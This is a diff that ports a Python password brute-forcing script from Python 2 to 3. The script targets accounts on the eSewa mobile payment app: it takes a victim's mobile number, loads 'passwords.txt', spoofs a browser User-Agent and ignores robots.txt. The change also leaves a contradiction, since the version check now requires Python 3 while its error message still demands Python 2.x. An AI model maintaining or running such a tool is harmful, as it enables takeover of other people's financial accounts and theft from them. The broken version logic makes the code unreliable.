@@ -2,7 +2,7 @@ import time
 import sys
 import subprocess
 
-if sys.version_info[0] != 2:
+if sys.version_info[0] != 3:
     print('''--------------------------------------
     REQUIRED PYTHON 2.x
     use: python fp2.py
@@ -11,7 +11,7 @@ if sys.version_info[0] != 2:
     sys.exit()
 
 package_name = "com.f1soft.esewa"
-subprocess.run(["adb", "shell", "am", "start", "-n", package_name + "/.MainActivity"])
+subprocess.run(["adb", "shell", "am", "start", "-n", package_name + "/.MainActivity"], check=True)
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
@@ -30,7 +30,7 @@ browser.set_handle_robots(False)
 print('\n----------Welcome|VICKY----------\n')
 file = open('passwords.txt', 'r')
 
-MobileNumber = raw_input('Mobile Number : ').strip()
+MobileNumber = input('Mobile Number : ').strip()
 
 print("\nTarget Mobile Number : ", MobileNumber)
 print("\nTrying Passwords from list ...")
